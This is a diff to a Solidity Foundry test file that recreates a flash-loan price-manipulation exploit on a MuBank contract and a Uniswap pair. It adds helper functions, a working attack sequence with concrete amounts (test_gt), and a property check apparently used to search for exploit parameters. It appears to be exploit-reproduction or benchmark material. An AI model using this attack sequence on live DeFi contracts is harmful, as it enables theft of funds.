@@ -2,12 +2,12 @@
 pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "@utils/QueryBlockchain.sol";
-import "@utils/USDCE.sol";
-import "./Mu.sol";
-import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import "./MuBank.sol";
+import "@utils/USDCE.sol";
+import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
+import "./Mu.sol";
 
 contract MUMUGTest is Test, BlockLoader {
     MuBank mubank;
@@ -56,6 +56,7 @@ contract MUMUGTest is Test, BlockLoader {
             address(0x0)
         );
         router = new UniswapV2Router(address(factory), address(0xdead));
+        mubank = new MuBank(address(router), address(pair), address(mu));
         // Initialize balances and mock flashloan.
         mu.transfer(address(mubank), balanceOfmumubank);
         mu.transfer(address(pair), balanceOfmupair);
@@ -64,5 +65,126 @@ contract MUMUGTest is Test, BlockLoader {
         usdce.transfer(address(pair), balanceOfusdcepair);
         usdce.approve(attacker, UINT256_MAX);
         vm.stopPrank();
+    }
+
+    function printBalance(string memory tips) public {
+        emit log_string(tips);
+        emit log_string("Mubank Balances: ");
+        queryERC20BalanceDecimals(address(mu), address(mubank), mu.decimals());
+        queryERC20BalanceDecimals(
+            address(usdce),
+            address(mubank),
+            usdce.decimals()
+        );
+        emit log_string("");
+        emit log_string("Pair Balances: ");
+        queryERC20BalanceDecimals(address(mu), address(pair), mu.decimals());
+        queryERC20BalanceDecimals(
+            address(usdce),
+            address(pair),
+            usdce.decimals()
+        );
+        emit log_string("");
+        emit log_string("Attacker Balances: ");
+        queryERC20BalanceDecimals(address(mu), attacker, mu.decimals());
+        queryERC20BalanceDecimals(address(usdce), attacker, usdce.decimals());
+        emit log_string("");
+        emit log_string("");
+        emit log_string("");
+    }
+
+    function attackGoal() public view returns (bool) {
+        return usdce.balanceOf(attacker) >= 10e6;
+    }
+
+    function nop(uint256 amount) internal pure {
+        return;
+    }
+
+    function borrow_mu(uint256 amount) internal {
+        mu.transferFrom(owner, attacker, amount);
+    }
+
+    function payback_mu(uint256 amount) internal {
+        mu.transfer(owner, amount);
+    }
+
+    function borrow_usdce(uint256 amount) internal {
+        usdce.transferFrom(owner, attacker, amount);
+    }
+
+    function payback_usdce(uint256 amount) internal {
+        usdce.transfer(owner, amount);
+    }
+
+    function swap_pair_usdce_mu(uint256 amount) internal {
+        usdce.approve(address(router), type(uint).max);
+        address[] memory path = new address[](2);
+        path[0] = address(usdce);
+        path[1] = address(mu);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amount,
+            1,
+            path,
+            attacker,
+            block.timestamp
+        );
+    }
+
+    function swap_pair_mu_usdce(uint256 amount) internal {
+        mu.approve(address(router), type(uint).max);
+        address[] memory path = new address[](2);
+        path[0] = address(mu);
+        path[1] = address(usdce);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amount,
+            1,
+            path,
+            attacker,
+            block.timestamp
+        );
+    }
+
+    function swap_mubank_usdce_mu(uint256 sendAmount) internal {
+        usdce.approve(address(mubank), type(uint).max);
+        mubank.mu_bond(address(usdce), sendAmount);
+    }
+
+    function attackTemp(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4
+    ) public {
+        printBalance("Before step0: ");
+        borrow_mu(amt0);
+        printBalance("Before step1: ");
+        swap_pair_mu_usdce(amt1);
+        printBalance("Before step2: ");
+        swap_mubank_usdce_mu(amt2);
+        printBalance("Before step3: ");
+        nop(amt3);
+        printBalance("Before step4: ");
+        payback_mu(amt4);
+        printBalance("After exploit: ");
+    }
+
+    function test_gt() public {
+        attackTemp(99000 ether, 99000 ether, 22960 ether, 0, 99300 ether);
+        require(attackGoal(), "Attack failed!");
+    }
+
+    function check_gt(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4
+    ) public {
+        vm.assume(amt0 == amt1);
+        vm.assume(amt4 == amt0 + 300 ether);
+        attackTemp(amt0, amt1, amt2, amt3, amt4);
+        assert(!attackGoal());
     }
 }
